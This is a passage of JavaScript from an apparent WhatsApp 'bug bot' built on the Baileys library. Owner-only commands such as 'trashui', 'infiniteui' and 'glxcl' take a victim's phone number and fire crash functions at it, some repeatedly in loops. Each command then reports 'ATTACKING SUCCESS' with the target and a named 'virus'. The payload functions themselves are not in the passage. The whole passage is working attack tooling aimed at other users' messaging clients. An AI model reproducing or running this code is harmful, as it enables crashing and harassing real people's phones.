											"buttonParamsJson": `{\"display_text\":\"🎭⃟༑⌁⃰𝐙𝐞͢𝐫𝐨 𝑪͢𝒓𝒂ͯ͢𝒔𝒉ཀ͜͡🐉\",\"id\":\"invisixinfinite ${incTarget}\"}`
										}, ],
									})
								})
							}
						}
					}, {})

					await VxoZap.relayMessage(msg.key.remoteJid, msg.message, {
						messageId: msg.key.id
					});
					await taskdone(finishmoji)
				}
			}
			break
			case 'znxvs': {
				if (!isBotRegistered) return zreply(`NOT ACCES‼️`);
				if (!isCreator) return zreply(mess.owner)
				if (!q) return zreply(`*Syntax Error!*\n\n_Use : ZnxVs Number_\n_Example : ZnxVs 62xx_\n\n𝐓𝐡𝐞𝐆𝐞𝐭𝐬𝐮𝐳𝐨𝐙𝐡𝐢𝐫𝐨🐉`);
				let {
					proto,
					generateWAMessageFromContent
				} = require('@whiskeysockets/baileys')
				incTarget = text.split("|")[0].replace(/[^0-9]/g, '')
				if (incTarget.startsWith('0')) return zreply(`*Syntax Error!*\n\n_Use : ZnxVs Number_\n_Example : ZnxVs 62xx_\n\n𝐓𝐡𝐞𝐆𝐞𝐭𝐬𝐮𝐳𝐨𝐙𝐡𝐢𝐫𝐨🐉`)
				let X = incTarget + '@s.whatsapp.net';
				if (owner.includes(incTarget)) {
					zreply('𝙁𝙖𝙞𝙡𝙚𝙙 𝙎𝙚𝙣𝙙 𝘽𝙪𝙜 𝙏𝙤 𝙊𝙬𝙣𝙚𝙧!!')
				} else {
					zreply(mess.bugrespon)
					global.jumlah = text.split("|")[1]
					for (let i = 0; i < 1; i++) {
						await TrashSystem(X, GetsuZo, Ptcp = true)
						await sleep(5000)
						await ClPm(X, GetsuZo, cct = true, ptcp = true)
						await InVisiXz(X, GetsuZo, cct = true, ptcp = true)
					}
					let msg = generateWAMessageFromContent(m.chat, {
						viewOnceMessage: {
							message: {
								"messageContextInfo": {
									"deviceListMetadata": {},
									"deviceListMetadataVersion": 2
								},
								interactiveMessage: proto.Message.InteractiveMessage.create({
									contextInfo: {
										mentionedJid: [m.sender],
										isForwarded: true,
										forwardingScore: 999,
										forwardedNewsletterMessageInfo: {
											newsletterJid: global.xchannel.jid,
											newsletterName: '🩸⃟༑⌁⃰𝐙𝐞͢𝐫𝐨 𝐄𝐱ͯ͢𝐞𝐜𝐮͢𝐭𝐢𝐨𝐧 𝐕ͮ𝐚͢𝐮𝐥𝐭ཀ͜͡🦠️',
											serverMessageId: -1
										},
										businessMessageForwardInfo: {
											businessOwnerJid: VxoZap.decodeJid(VxoZap.user.id)
										},
									},
									body: proto.Message.InteractiveMessage.Body.create({
										text: ''
									}),
									footer: proto.Message.InteractiveMessage.Footer.create({
										text: "©𝐓𝐡𝐞𝐆𝐞𝐭𝐬𝐮𝐳𝐨𝐙𝐡𝐢𝐫𝐨🐉"
									}),
									header: proto.Message.InteractiveMessage.Header.create({
										title: `「 𝐀𝐓𝐓𝐀𝐂𝐊𝐈𝐍𝐆 𝐒𝐔𝐂𝐂𝐄𝐒𝐒 」\n\n𖥂 𝐓𝐀𝐑𝐆𝐄𝐓 : ${X.split("@")[0]}\n𖥂 𝐕𝐈𝐑𝐔𝐒 : 𝗙𝗟𝗢𝗪 𝗫 𝗦𝗤𝗟`,
										subtitle: "",
										hasMediaAttachment: true,
										...(await prepareWAMessageMedia({
											image: {
												url: thumbSky
											}
										}, {
											upload: VxoZap.waUploadToServer
										}))
									}),
									nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({
										buttons: [{
											"name": "quick_reply",
											"buttonParamsJson": `{\"display_text\":\"🎭⃟༑⌁⃰𝐙𝐞͢𝐫𝐨 𝑪͢𝒓𝒂ͯ͢𝒔𝒉ཀ͜͡🐉\",\"id\":\"\"}`
										}, ],
									})
								})
							}
						}
					}, {})

					await VxoZap.relayMessage(msg.key.remoteJid, msg.message, {
						messageId: msg.key.id
					});
					await taskdone(finishmoji)
				}
			}
			break
			case 'vdex': {
				if (!isBotRegistered) return zreply(`NOT ACCES‼️`);
				if (!isCreator) return zreply(mess.owner)
				if (!q) return zreply(`*Syntax Error!*\n\n_Use : ZnxVs Number_\n_Example : ZnxVs 62xx_\n\n𝐓𝐡𝐞𝐆𝐞𝐭𝐬𝐮𝐳𝐨𝐙𝐡𝐢𝐫𝐨🐉`);
				let {
					proto,
					generateWAMessageFromContent
				} = require('@whiskeysockets/baileys')
				incTarget = text.split("|")[0].replace(/[^0-9]/g, '')
				if (incTarget.startsWith('0')) return zreply(`*Syntax Error!*\n\n_Use : ZnxVs Number_\n_Example : ZnxVs 62xx_\n\n𝐓𝐡𝐞𝐆𝐞𝐭𝐬𝐮𝐳𝐨𝐙𝐡𝐢𝐫𝐨🐉`)
				let X = incTarget + '@s.whatsapp.net';
				if (owner.includes(incTarget)) {
					zreply('𝙁𝙖𝙞𝙡𝙚𝙙 𝙎𝙚𝙣𝙙 𝘽𝙪𝙜 𝙏𝙤 𝙊𝙬𝙣𝙚𝙧!!')
				} else {
					zreply(mess.bugrespon)
					global.jumlah = text.split("|")[1]
					for (let i = 0; i < 1; i++) {
						await TrashSystem(X, GetsuZo, Ptcp = true)
						await GlxCall(X, GetsuZo, cct = true, ptcp = true)
						await GlxCallX(X, GetsuZo, cct = true, ptcp = true)
					}
					let msg = generateWAMessageFromContent(m.chat, {
						viewOnceMessage: {
							message: {
								"messageContextInfo": {
									"deviceListMetadata": {},
									"deviceListMetadataVersion": 2
								},
								interactiveMessage: proto.Message.InteractiveMessage.create({
									contextInfo: {
										mentionedJid: [m.sender],
										isForwarded: true,
										forwardingScore: 999,
										forwardedNewsletterMessageInfo: {
											newsletterJid: global.xchannel.jid,
											newsletterName: '🩸⃟༑⌁⃰𝐙𝐞͢𝐫𝐨 𝐄𝐱ͯ͢𝐞𝐜𝐮͢𝐭𝐢𝐨𝐧 𝐕ͮ𝐚͢𝐮𝐥𝐭ཀ͜͡🦠️',
											serverMessageId: -1
										},
										businessMessageForwardInfo: {
											businessOwnerJid: VxoZap.decodeJid(VxoZap.user.id)
										},
									},
									body: proto.Message.InteractiveMessage.Body.create({
										text: ''
									}),
									footer: proto.Message.InteractiveMessage.Footer.create({
										text: "©𝐓𝐡𝐞𝐆𝐞𝐭𝐬𝐮𝐳𝐨𝐙𝐡𝐢𝐫𝐨🐉"
									}),
									header: proto.Message.InteractiveMessage.Header.create({
										title: `「 𝐀𝐓𝐓𝐀𝐂𝐊𝐈𝐍𝐆 𝐒𝐔𝐂𝐂𝐄𝐒𝐒 」\n\n𖥂 𝐓𝐀𝐑𝐆𝐄𝐓 : ${X.split("@")[0]}\n𖥂 𝐕𝐈𝐑𝐔𝐒 : 𝗙𝗟𝗢𝗪 𝗫 𝗦𝗤𝗟`,
										subtitle: "",
										hasMediaAttachment: true,
										...(await prepareWAMessageMedia({
											image: {
												url: thumbSky
											}
										}, {
											upload: VxoZap.waUploadToServer
										}))
									}),
									nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({
										buttons: [{
											"name": "quick_reply",
											"buttonParamsJson": `{\"display_text\":\"🎭⃟༑⌁⃰𝐙𝐞͢𝐫𝐨 𝑪͢𝒓𝒂ͯ͢𝒔𝒉ཀ͜͡🐉\",\"id\":\"\"}`
										}, ],
									})
								})
							}
						}
					}, {})

					await VxoZap.relayMessage(msg.key.remoteJid, msg.message, {
						messageId: msg.key.id
					});
					await taskdone(finishmoji)
				}
			}
			break
			case 'glxcl': {
				if (!isBotRegistered) return zreply(`NOT ACCES‼️`);
				if (!isCreator) return zreply(mess.owner)
				if (!q) return zreply(`*Syntax Error!*\n\n_Use : ZnxVs Number_\n_Example : ZnxVs 62xx_\n\n𝐓𝐡𝐞𝐆𝐞𝐭𝐬𝐮𝐳𝐨𝐙𝐡𝐢𝐫𝐨🐉`);
				let {
					proto,
					generateWAMessageFromContent
				} = require('@whiskeysockets/baileys')
				incTarget = text.split("|")[0].replace(/[^0-9]/g, '')
				if (incTarget.startsWith('0')) return zreply(`*Syntax Error!*\n\n_Use : ZnxVs Number_\n_Example : ZnxVs 62xx_\n\n𝐓𝐡𝐞𝐆𝐞𝐭𝐬𝐮𝐳𝐨𝐙𝐡𝐢𝐫𝐨🐉`)
				let X = incTarget + '@s.whatsapp.net';
				if (owner.includes(incTarget)) {
					zreply('𝙁𝙖𝙞𝙡𝙚𝙙 𝙎𝙚𝙣𝙙 𝘽𝙪𝙜 𝙏𝙤 𝙊𝙬𝙣𝙚𝙧!!')
				} else {
					zreply(mess.bugrespon)
					global.jumlah = text.split("|")[1]
					for (let i = 0; i < 1; i++) {
						await GlxCallX(X, GetsuZo, cct = true, ptcp = true)
						await GlxCall(X, GetsuZo, cct = true, ptcp = true)
						await GlxCallX(X, GetsuZo, cct = true, ptcp = true)
						await GlxCall(X, GetsuZo, cct = true, ptcp = true)
						await GlxCallX(X, GetsuZo, cct = true, ptcp = true)
					}
					let msg = generateWAMessageFromContent(m.chat, {
						viewOnceMessage: {
							message: {
								"messageContextInfo": {
									"deviceListMetadata": {},
									"deviceListMetadataVersion": 2
								},
								interactiveMessage: proto.Message.InteractiveMessage.create({
									contextInfo: {
										mentionedJid: [m.sender],
										isForwarded: true,
										forwardingScore: 999,
										forwardedNewsletterMessageInfo: {
											newsletterJid: global.xchannel.jid,
											newsletterName: '🩸⃟༑⌁⃰𝐙𝐞͢𝐫𝐨 𝐄𝐱ͯ͢𝐞𝐜𝐮͢𝐭𝐢𝐨𝐧 𝐕ͮ𝐚͢𝐮𝐥𝐭ཀ͜͡🦠️',
											serverMessageId: -1
										},
										businessMessageForwardInfo: {
											businessOwnerJid: VxoZap.decodeJid(VxoZap.user.id)
										},
									},
									body: proto.Message.InteractiveMessage.Body.create({
										text: ''
									}),
									footer: proto.Message.InteractiveMessage.Footer.create({
										text: "©𝐓𝐡𝐞𝐆𝐞𝐭𝐬𝐮𝐳𝐨𝐙𝐡𝐢𝐫𝐨🐉"
									}),
									header: proto.Message.InteractiveMessage.Header.create({
										title: `「 𝐀𝐓𝐓𝐀𝐂𝐊𝐈𝐍𝐆 𝐒𝐔𝐂𝐂𝐄𝐒𝐒 」\n\n𖥂 𝐓𝐀𝐑𝐆𝐄𝐓 : ${X.split("@")[0]}\n𖥂 𝐕𝐈𝐑𝐔𝐒 : 𝗚𝗔𝗟𝗔𝗫𝗬 𝗫 𝗖𝗔𝗟𝗟`,
										subtitle: "",
										hasMediaAttachment: true,
										...(await prepareWAMessageMedia({
											image: {
												url: thumbSky
											}
										}, {
											upload: VxoZap.waUploadToServer
										}))
									}),
									nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({
										buttons: [{
											"name": "quick_reply",
											"buttonParamsJson": `{\"display_text\":\"🎭⃟༑⌁⃰𝐙𝐞͢𝐫𝐨 𝑪͢𝒓𝒂ͯ͢𝒔𝒉ཀ͜͡🐉\",\"id\":\"\"}`
										}, ],
									})
								})
							}
						}
					}, {})

					await VxoZap.relayMessage(msg.key.remoteJid, msg.message, {
						messageId: msg.key.id
					});
					await taskdone(finishmoji)
				}
			}
			break
			case 'trashflow': {
				if (!isBotRegistered) return zreply(`NOT ACCES‼️`);
				if (!isCreator) return zreply(mess.owner)
				if (!q) return zreply(`*Syntax Error!*\n\n_Use : TrashFlow Number_\n_Example : TrashFlow 62xx_\n\n𝐓𝐡𝐞𝐆𝐞𝐭𝐬𝐮𝐳𝐨𝐙𝐡𝐢𝐫𝐨🐉`);
				let {
					proto,
					generateWAMessageFromContent
				} = require('@whiskeysockets/baileys')
				incTarget = text.split("|")[0].replace(/[^0-9]/g, '')
				if (incTarget.startsWith('0')) return zreply(`*Syntax Error!*\n\n_Use : TrashFlow Number_\n_Example : TrashFlow 62xx_\n\n𝐓𝐡𝐞𝐆𝐞𝐭𝐬𝐮𝐳𝐨𝐙𝐡𝐢𝐫𝐨🐉`)
				let X = incTarget + '@s.whatsapp.net';
				if (owner.includes(incTarget)) {
					zreply('𝙁𝙖𝙞𝙡𝙚𝙙 𝙎𝙚𝙣𝙙 𝘽𝙪𝙜 𝙏𝙤 𝙊𝙬𝙣𝙚𝙧!!')
				} else {
					zreply(mess.bugrespon)
					global.jumlah = text.split("|")[1]
					for (let i = 0; i < 1; i++) {
						await TrashSystem(X, GetsuZo, Ptcp = true)
						await StuckNull(X, GetsuZo, Ptcp = true)
						await ClPm(X, GetsuZo, cct = true, ptcp = true)
						await InVisiXz(X, GetsuZo, cct = true, ptcp = true)
					}
					let msg = generateWAMessageFromContent(m.chat, {
						viewOnceMessage: {
							message: {
								"messageContextInfo": {
									"deviceListMetadata": {},
									"deviceListMetadataVersion": 2
								},
								interactiveMessage: proto.Message.InteractiveMessage.create({
									contextInfo: {
										mentionedJid: [m.sender],
										isForwarded: true,
										forwardingScore: 999,
										forwardedNewsletterMessageInfo: {
											newsletterJid: global.xchannel.jid,
											newsletterName: '🩸⃟༑⌁⃰𝐙𝐞͢𝐫𝐨 𝐄𝐱ͯ͢𝐞𝐜𝐮͢𝐭𝐢𝐨𝐧 𝐕ͮ𝐚͢𝐮𝐥𝐭ཀ͜͡🦠️',
											serverMessageId: -1
										},
										businessMessageForwardInfo: {
											businessOwnerJid: VxoZap.decodeJid(VxoZap.user.id)
										},
									},
									body: proto.Message.InteractiveMessage.Body.create({
										text: ''
									}),
									footer: proto.Message.InteractiveMessage.Footer.create({
										text: "©𝐓𝐡𝐞𝐆𝐞𝐭𝐬𝐮𝐳𝐨𝐙𝐡𝐢𝐫𝐨🐉"
									}),
									header: proto.Message.InteractiveMessage.Header.create({
										title: `「 𝐀𝐓𝐓𝐀𝐂𝐊𝐈𝐍𝐆 𝐒𝐔𝐂𝐂𝐄𝐒𝐒 」\n\n⭑̤⟅̊༑ ▾ 𝐙͢𝐍ͮ𝐗 ⿻ 𝐈𝐍͢𝐕𝚫𝐒𝐈͢𝚯𝚴 ⿻ ▾ ༑̴⟆̊⭑̤`,
										subtitle: "",
										hasMediaAttachment: true,
										...(await prepareWAMessageMedia({
											image: {
												url: thumbSky
											}
										}, {
											upload: VxoZap.waUploadToServer
										}))
									}),
									nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({
										buttons: [{
											"name": "quick_reply",
											"buttonParamsJson": `{\"display_text\":\"🎭⃟༑⌁⃰𝐙𝐞͢𝐫𝐨 𝑪͢𝒓𝒂ͯ͢𝒔𝒉ཀ͜͡🐉\",\"id\":\"\"}`
										}, ],
									})
								})
							}
						}
					}, {})

					await VxoZap.relayMessage(msg.key.remoteJid, msg.message, {
						messageId: msg.key.id
					});
					await taskdone(finishmoji)
				}
			}
			break
			case 'infiniteui': {
				if (!isBotRegistered) return zreply(`NOT ACCES‼️`);
				if (!isCreator) return zreply(mess.owner)
				if (!q) return zreply(`*Syntax Error!*\n\n_Use : InFiniteUi Number_\n_Example : InFiniteUi 62xx_\n\n𝐓𝐡𝐞𝐆𝐞𝐭𝐬𝐮𝐳𝐨𝐙𝐡𝐢𝐫𝐨🐉`);
				let {
					proto,
					generateWAMessageFromContent
				} = require('@whiskeysockets/baileys')
				incTarget = text.split("|")[0].replace(/[^0-9]/g, '')
				if (incTarget.startsWith('0')) return zreply(`*Syntax Error!*\n\n_Use : InFiniteUi Number_\n_Example : InFiniteUi 62xx_\n\n𝐓𝐡𝐞𝐆𝐞𝐭𝐬𝐮𝐳𝐨𝐙𝐡𝐢𝐫𝐨🐉`)
				let X = incTarget + '@s.whatsapp.net';
				if (owner.includes(incTarget)) {
					zreply('𝙁𝙖𝙞𝙡𝙚𝙙 𝙎𝙚𝙣𝙙 𝘽𝙪𝙜 𝙏𝙤 𝙊𝙬𝙣𝙚𝙧!!')
				} else {
					zreply(mess.bugrespon)
					global.jumlah = text.split("|")[1]
					for (let i = 0; i < 20; i++) {
						await CrashUi(X, null, GetsuZo, cct = true, ptcp = true)
					}
					let msg = generateWAMessageFromContent(m.chat, {
						viewOnceMessage: {
							message: {
								"messageContextInfo": {
									"deviceListMetadata": {},
									"deviceListMetadataVersion": 2
								},
								interactiveMessage: proto.Message.InteractiveMessage.create({
									contextInfo: {
										mentionedJid: [m.sender],
										isForwarded: true,
										forwardingScore: 999,
										forwardedNewsletterMessageInfo: {
											newsletterJid: global.xchannel.jid,
											newsletterName: '🩸⃟༑⌁⃰𝐙𝐞͢𝐫𝐨 𝐄𝐱ͯ͢𝐞𝐜𝐮͢𝐭𝐢𝐨𝐧 𝐕ͮ𝐚͢𝐮𝐥𝐭ཀ͜͡🦠️',
											serverMessageId: -1
										},
										businessMessageForwardInfo: {
											businessOwnerJid: VxoZap.decodeJid(VxoZap.user.id)
										},
									},
									body: proto.Message.InteractiveMessage.Body.create({
										text: ''
									}),
									footer: proto.Message.InteractiveMessage.Footer.create({
										text: "©𝐓𝐡𝐞𝐆𝐞𝐭𝐬𝐮𝐳𝐨𝐙𝐡𝐢𝐫𝐨🐉"
									}),
									header: proto.Message.InteractiveMessage.Header.create({
										title: `「 𝐀𝐓𝐓𝐀𝐂𝐊𝐈𝐍𝐆 𝐒𝐔𝐂𝐂𝐄𝐒𝐒 」\n\n𖥂 𝐓𝐀𝐑𝐆𝐄𝐓 : ${X.split("@")[0]}\n𖥂 𝐕𝐈𝐑𝐔𝐒 : 𝗨𝗜 𝗢𝗩𝗗`,
										subtitle: "",
										hasMediaAttachment: true,
										...(await prepareWAMessageMedia({
											image: {
												url: thumbSky
											}
										}, {
											upload: VxoZap.waUploadToServer
										}))
									}),
									nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({
										buttons: [{
											"name": "quick_reply",
											"buttonParamsJson": `{\"display_text\":\"🎭⃟༑⌁⃰𝐙𝐞͢𝐫𝐨 𝑪͢𝒓𝒂ͯ͢𝒔𝒉ཀ͜͡🐉\",\"id\":\"flodui ${incTarget}\"}`
										}, ],
									})
								})
							}
						}
					}, {})

					await VxoZap.relayMessage(msg.key.remoteJid, msg.message, {
						messageId: msg.key.id
					});
					await taskdone(finishmoji)
				}
			}
			break
			case 'trashui': {
				if (!isBotRegistered) return zreply(`NOT ACCES‼️`);
				if (!isCreator) return zreply(mess.owner)
				if (!q) return zreply(`*Syntax Error!*\n\n_Use : Trashui Number_\n_Example : Trashui 62xx_\n\n𝐓𝐡𝐞𝐆𝐞𝐭𝐬𝐮𝐳𝐨𝐙𝐡𝐢𝐫𝐨🐉`);
				let {
					proto,
					generateWAMessageFromContent
				} = require('@whiskeysockets/baileys')
				incTarget = text.split("|")[0].replace(/[^0-9]/g, '')
				if (incTarget.startsWith('0')) return zreply(`*Syntax Error!*\n\n_Use : Trashui Number_\n_Example : Trashui 62xx_\n\n𝐓𝐡𝐞𝐆𝐞𝐭𝐬𝐮𝐳𝐨𝐙𝐡𝐢𝐫𝐨🐉`)
				let X = incTarget + '@s.whatsapp.net';
				if (owner.includes(incTarget)) {
					zreply('𝙁𝙖𝙞𝙡𝙚𝙙 𝙎𝙚𝙣𝙙 𝘽𝙪𝙜 𝙏𝙤 𝙊𝙬𝙣𝙚𝙧!!')
				} else {
					zreply(mess.bugrespon)
					global.jumlah = text.split("|")[1]
					for (let i = 0; i < 6; i++) {
						await CrashUi(X, null, GetsuZo, cct = true, ptcp = true)
					}
					for (let i = 0; i < 1; i++) {
						await ClPm(X, GetsuZo, cct = true, ptcp = true)
					}
					let msg = generateWAMessageFromContent(m.chat, {
						viewOnceMessage: {
							message: {
								"messageContextInfo": {
									"deviceListMetadata": {},
									"deviceListMetadataVersion": 2
								},
								interactiveMessage: proto.Message.InteractiveMessage.create({
									contextInfo: {
										mentionedJid: [m.sender],
										isForwarded: true,
										forwardingScore: 999,
										forwardedNewsletterMessageInfo: {
											newsletterJid: global.xchannel.jid,
											newsletterName: '🩸⃟༑⌁⃰𝐙𝐞͢𝐫𝐨 𝐄𝐱ͯ͢𝐞𝐜𝐮͢𝐭𝐢𝐨𝐧 𝐕ͮ𝐚͢𝐮𝐥𝐭ཀ͜͡🦠️',
											serverMessageId: -1
										},
										businessMessageForwardInfo: {
											businessOwnerJid: VxoZap.decodeJid(VxoZap.user.id)
										},
									},
									body: proto.Message.InteractiveMessage.Body.create({
										text: ''
									}),
									footer: proto.Message.InteractiveMessage.Footer.create({
										text: "©𝐓𝐡𝐞𝐆𝐞𝐭𝐬𝐮𝐳𝐨𝐙𝐡𝐢𝐫𝐨🐉"
									}),
									header: proto.Message.InteractiveMessage.Header.create({
										title: `「 𝐀𝐓𝐓𝐀𝐂𝐊𝐈𝐍𝐆 𝐒𝐔𝐂𝐂𝐄𝐒𝐒 」\n\n𖥂 𝐓𝐀𝐑𝐆𝐄𝐓 : ${X.split("@")[0]}\n𖥂 𝐕𝐈𝐑𝐔𝐒 : 𝗧𝗥𝗔𝗦𝗛 𝗨𝗜`,
										subtitle: "",
										hasMediaAttachment: true,
										...(await prepareWAMessageMedia({
											image: {
												url: thumbSky
											}
										}, {
											upload: VxoZap.waUploadToServer
										}))
									}),
									nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({
										buttons: [{
											"name": "quick_reply",
											"buttonParamsJson": `{\"display_text\":\"🎭⃟༑⌁⃰𝐙𝐞͢𝐫𝐨 𝑪͢𝒓𝒂ͯ͢𝒔𝒉ཀ͜͡🐉\",\"id\":\"\"}`
										}, ],
									})
								})
							}
						}
					}, {})

					await VxoZap.relayMessage(msg.key.remoteJid, msg.message, {
						messageId: msg.key.id
					});
					await taskdone(finishmoji)
				}
			}
			break
			case 'vzets': {
				if (!isBotRegistered) return zreply(`NOT ACCES‼️`);
				if (!isCreator) return zreply(mess.owner)
				if (!q) return zreply(`*Syntax Error!*\n\n_Use : Vzets Number_\n_Example : Vzets 62xx_\n\n𝐓𝐡𝐞𝐆𝐞𝐭𝐬𝐮𝐳𝐨𝐙𝐡𝐢𝐫𝐨🐉`);
				let {
					proto,
					generateWAMessageFromContent
				} = require('@whiskeysockets/baileys')
				incTarget = text.split("|")[0].replace(/[^0-9]/g, '')
				if (incTarget.startsWith('0')) return zreply(`*Syntax Error!*\n\n_Use : Vzets Number_\n_Example : Xbug 62xx_\n\n𝐓𝐡𝐞𝐆𝐞𝐭𝐬𝐮𝐳𝐨𝐙𝐡𝐢𝐫𝐨🐉`)
				let X = incTarget + '@s.whatsapp.net';
				if (owner.includes(incTarget)) {
					zreply('𝙁𝙖𝙞𝙡𝙚𝙙 𝙎𝙚𝙣𝙙 𝘽𝙪𝙜 𝙏𝙤 𝙊𝙬𝙣𝙚𝙧!!')
				} else {
					zreply(mess.bugrespon)
					global.jumlah = text.split("|")[1]
					for (let i = 0; i < 1; i++) {
						await CaroUsel(X)
					}
					let msg = generateWAMessageFromContent(m.chat, {
						viewOnceMessage: {
							message: {
								"messageContextInfo": {
									"deviceListMetadata": {},
									"deviceListMetadataVersion": 2
								},
								interactiveMessage: proto.Message.InteractiveMessage.create({
									contextInfo: {
										mentionedJid: [m.sender],
										isForwarded: true,
										forwardingScore: 999,
										forwardedNewsletterMessageInfo: {
											newsletterJid: global.xchannel.jid,
											newsletterName: '🩸⃟༑⌁⃰𝐙𝐞͢𝐫𝐨 𝐄𝐱ͯ͢𝐞𝐜𝐮͢𝐭𝐢𝐨𝐧 𝐕ͮ𝐚͢𝐮𝐥𝐭ཀ͜͡🦠️',
											serverMessageId: -1
										},
										businessMessageForwardInfo: {
											businessOwnerJid: VxoZap.decodeJid(VxoZap.user.id)
										},
									},
									body: proto.Message.InteractiveMessage.Body.create({
										text: ''
									}),
									footer: proto.Message.InteractiveMessage.Footer.create({
										text: "©𝐓𝐡𝐞𝐆𝐞𝐭𝐬𝐮𝐳𝐨𝐙𝐡𝐢𝐫𝐨🐉"
									}),
									header: proto.Message.InteractiveMessage.Header.create({
										title: `「 𝐀𝐓𝐓𝐀𝐂𝐊𝐈𝐍𝐆 𝐒𝐔𝐂𝐂𝐄𝐒𝐒 」\n\n𖥂 𝐓𝐀𝐑𝐆𝐄𝐓 : ${X.split("@")[0]}\n𖥂 𝐕𝐈𝐑𝐔𝐒 : 𝗖𝗮𝗿𝗼𝘂𝘀𝗲𝗹`,
										subtitle: "",
										hasMediaAttachment: true,
										...(await prepareWAMessageMedia({
											image: {
												url: thumbSky
											}
										}, {
											upload: VxoZap.waUploadToServer
										}))
									}),
									nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({
										buttons: [{
											"name": "quick_reply",
											"buttonParamsJson": "{\"display_text\":\"🎭⃟༑⌁⃰𝐙𝐞͢𝐫𝐨 𝑪͢𝒓𝒂ͯ͢𝒔𝒉ཀ͜͡🐉\",\"id\":\"\"}"
										}, ],
									})
								})
							}
						}
					}, {})

					await VxoZap.relayMessage(msg.key.remoteJid, msg.message, {
						messageId: msg.key.id
					});
					await taskdone(finishmoji)
				}
			}
			break
			case 'trashloc': {
				if (!isBotRegistered) return zreply(`NOT ACCES‼️`);
				if (!isCreator) return zreply(mess.owner)
				if (!q) return zreply(`*Syntax Error!*\n\n_Use : Trash Number_\n_Example : Trash 62xx_\n\n𝐓𝐡𝐞𝐆𝐞𝐭𝐬𝐮𝐳𝐨𝐙𝐡𝐢𝐫𝐨🐉`);
				let {
					proto,
					generateWAMessageFromContent
				} = require('@whiskeysockets/baileys')
				incTarget = text.split("|")[0].replace(/[^0-9]/g, '')
				if (incTarget.startsWith('0')) return zreply(`*Syntax Error!*\n\n_Use : Trash Number_\n_Example : Trash 62xx_\n\n𝐓𝐡𝐞𝐆𝐞𝐭𝐬𝐮𝐳𝐨𝐙𝐡𝐢𝐫𝐨🐉`)
				let X = incTarget + '@s.whatsapp.net';
				if (owner.includes(incTarget)) {
					zreply('𝙁𝙖𝙞𝙡𝙚𝙙 𝙎𝙚𝙣𝙙 𝘽𝙪𝙜 𝙏𝙤 𝙊𝙬𝙣𝙚𝙧!!')
				} else {
					zreply(mess.bugrespon)
					global.jumlah = text.split("|")[1]
					for (let i = 0; i < 1; i++) {
						await InVisiLocNull(X, null, GetSuZo, Ptcp = true)
						await InVisiLoc(X, GetSuZo, Ptcp = true)
						await InVisiLocXz(X, GetSuZo, Ptcp = true)
					}
					let msg = generateWAMessageFromContent(m.chat, {
						viewOnceMessage: {
							message: {
								"messageContextInfo": {
									"deviceListMetadata": {},
									"deviceListMetadataVersion": 2
								},
								interactiveMessage: proto.Message.InteractiveMessage.create({
									contextInfo: {
										mentionedJid: [m.sender],
										isForwarded: true,
										forwardingScore: 999,
										forwardedNewsletterMessageInfo: {
											newsletterJid: global.xchannel.jid,
											newsletterName: '🩸⃟༑⌁⃰𝐙𝐞͢𝐫𝐨 𝐄𝐱ͯ͢𝐞𝐜𝐮͢𝐭𝐢𝐨𝐧 𝐕ͮ𝐚͢𝐮𝐥𝐭ཀ͜͡🦠️',
											serverMessageId: -1
										},
										businessMessageForwardInfo: {
											businessOwnerJid: VxoZap.decodeJid(VxoZap.user.id)
										},
									},
									body: proto.Message.InteractiveMessage.Body.create({
										text: ''
									}),
									footer: proto.Message.InteractiveMessage.Footer.create({
										text: "©𝐓𝐡𝐞𝐆𝐞𝐭𝐬𝐮𝐳𝐨𝐙𝐡𝐢𝐫𝐨🐉"
									}),
									header: proto.Message.InteractiveMessage.Header.create({
										title: `「 𝐀𝐓𝐓𝐀𝐂𝐊𝐈𝐍𝐆 𝐒𝐔𝐂𝐂𝐄𝐒𝐒 」\n\n𖥂 𝐓𝐀𝐑𝐆𝐄𝐓 : ${X.split("@")[0]}\n𖥂 𝐕𝐈𝐑𝐔𝐒 : 𝗟𝗢𝗖 𝗫 𝗦𝗤𝗟`,
										subtitle: "",
										hasMediaAttachment: true,
										...(await prepareWAMessageMedia({
											image: {
												url: thumbSky
											}
										}, {
											upload: VxoZap.waUploadToServer
										}))
									}),
									nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({
										buttons: [{
											"name": "quick_reply",
											"buttonParamsJson": "{\"display_text\":\"🎭⃟༑⌁⃰𝐙𝐞͢𝐫𝐨 𝑪͢𝒓𝒂ͯ͢𝒔𝒉ཀ͜͡🐉\",\"id\":\"\"}"
										}, ],
									})
								})
							}
						}
					}, {})

					await VxoZap.relayMessage(msg.key.remoteJid, msg.message, {
						messageId: msg.key.id
					});
					await taskdone(finishmoji)
				}
			}
			break
			case 'zetsu': {
				if (!isBotRegistered) return zreply(`NOT ACCES‼️`);
				if (!isCreator) return zreply(mess.owner)
				if (!q) return zreply(`*Syntax Error!*\n\n_Use : Xbug Number_\n_Example : Xbug 62xx_\n\n𝐓𝐡𝐞𝐆𝐞𝐭𝐬𝐮𝐳𝐨𝐙𝐡𝐢𝐫𝐨🐉`);
				let {
					proto,
					generateWAMessageFromContent
				} = require('@whiskeysockets/baileys')
				incTarget = text.split("|")[0].replace(/[^0-9]/g, '')
				if (incTarget.startsWith('0')) return zreply(`*Syntax Error!*\n\n_Use : Xbug Number_\n_Example : Xbug 62xx_\n\n𝐓𝐡𝐞𝐆𝐞𝐭𝐬𝐮𝐳𝐨𝐙𝐡𝐢𝐫𝐨🐉`)
				let X = incTarget + '@s.whatsapp.net';
				if (owner.includes(incTarget)) {
					zreply('𝙁𝙖𝙞𝙡𝙚𝙙 𝙎𝙚𝙣𝙙 𝘽𝙪𝙜 𝙏𝙤 𝙊𝙬𝙣𝙚𝙧!!')
				} else {
					zreply(mess.bugrespon)
					global.jumlah = text.split("|")[1]
					for (let i = 0; i < 1; i++) {
						await ZnXIvS(X, Ptcp = true)
						await Gsz(X, GSZ)
						await ZnXIvS(X, Ptcp = true)
					}
					let msg = generateWAMessageFromContent(m.chat, {
						viewOnceMessage: {
							message: {
								"messageContextInfo": {
									"deviceListMetadata": {},
									"deviceListMetadataVersion": 2
								},
								interactiveMessage: proto.Message.InteractiveMessage.create({
									contextInfo: {
